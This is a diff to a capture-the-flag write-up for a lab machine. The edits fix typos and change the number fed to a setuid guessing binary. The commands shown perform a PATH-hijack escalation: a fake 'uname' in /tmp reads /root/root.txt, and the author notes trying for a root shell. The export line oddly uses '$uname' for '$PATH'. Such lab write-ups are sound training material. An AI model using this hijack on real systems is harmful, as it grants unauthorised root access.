@@ -259,12 +259,12 @@ From the above code it is obvious that on Correct guess it will call uname -p co
 lets create a malicious code to be executed.
 
 ```bash
-hermonine@hogwartz-castle:/home/hermonine$  echo '123'|/srv/time-turner/swagger| awk -F 'of ' '{print $2}' |/srv/time-turner/swagger
+hermonine@hogwartz-castle:/home/hermonine$  echo '2444666668888888'|/srv/time-turner/swagger| awk -F 'of ' '{print $2}' |/srv/time-turner/swagger
 
 Guess my number: Nice use of the time-turner!
 This system architecture is x86_64
 ```
-We were able to guess correct number now its turn to cat out our flag. ove to tmp directory and create a file uname with the command to be executed
+We were able to guess correct number now its turn to cat out our flag. Move to tmp directory and create a file uname with the command to be executed
 on successful binary execution. I tried to get a shell or even change the password of root user bu didn't work.
 
 ```bash
@@ -272,7 +272,7 @@ hermonine@hogwartz-castle:/home/hermonine$ cd /tmp
 hermonine@hogwartz-castle:/home/hermonine$ echo 'cat /root/root.txt'>uname
 hermonine@hogwartz-castle:/home/hermonine$ chmod +x uname
 hermonine@hogwartz-castle:/home/hermonine$ export PATH=/tmp:$uname
-hermonine@hogwartz-castle:/home/hermonine$ echo '123'|/srv/time-turner/swagger| awk -F 'of ' '{print $2}' |/srv/time-turner/swagger
+hermonine@hogwartz-castle:/home/hermonine$ echo '2444666668888888'|/srv/time-turner/swagger| awk -F 'of ' '{print $2}' |/srv/time-turner/swagger
 
 Guess my number: Nice use of the time-turner!
 This system architecture is RME{********************************}
